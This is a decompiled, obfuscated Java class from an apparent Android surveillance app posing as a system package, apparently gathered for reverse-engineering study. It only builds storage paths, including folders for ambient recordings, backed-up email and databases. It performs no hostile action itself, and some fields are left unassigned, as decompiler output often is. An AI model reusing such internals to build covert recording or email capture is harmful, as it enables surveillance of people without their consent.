package com.app.system.common;

import android.content.Context;
import com.android.system.CoreApp;
import java.io.File;

public class c
{
  public static final String a;
  public static final String b;
  public static final String c;
  public static final String d;
  public static final String e;
  public static final String f;
  public static final String g;
  public static final String h;
  
  static
  {
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append(CoreApp.a().getFilesDir().getParentFile().getPath());
    localStringBuilder.append("/android_ambient_record_libs/");
    d = localStringBuilder.toString();
    localStringBuilder = new StringBuilder();
    localStringBuilder.append(CoreApp.a().getFilesDir().getParentFile().getPath());
    localStringBuilder.append("/BackupEmail/");
    e = localStringBuilder.toString();
    localStringBuilder = new StringBuilder();
    localStringBuilder.append(CoreApp.a().getFilesDir().getParentFile().getPath());
    localStringBuilder.append("/");
    f = localStringBuilder.toString();
    localStringBuilder = new StringBuilder();
    localStringBuilder.append(CoreApp.a().getFilesDir().getParentFile().getPath());
    localStringBuilder.append("/");
    g = localStringBuilder.toString();
    localStringBuilder = new StringBuilder();
    localStringBuilder.append(CoreApp.a().getFilesDir().getParentFile().getPath());
    localStringBuilder.append("/databases/");
    h = localStringBuilder.toString();
  }
}


/* Location:              ~/com/app/system/common/c.class
 *
 * Reversed by:           J
 */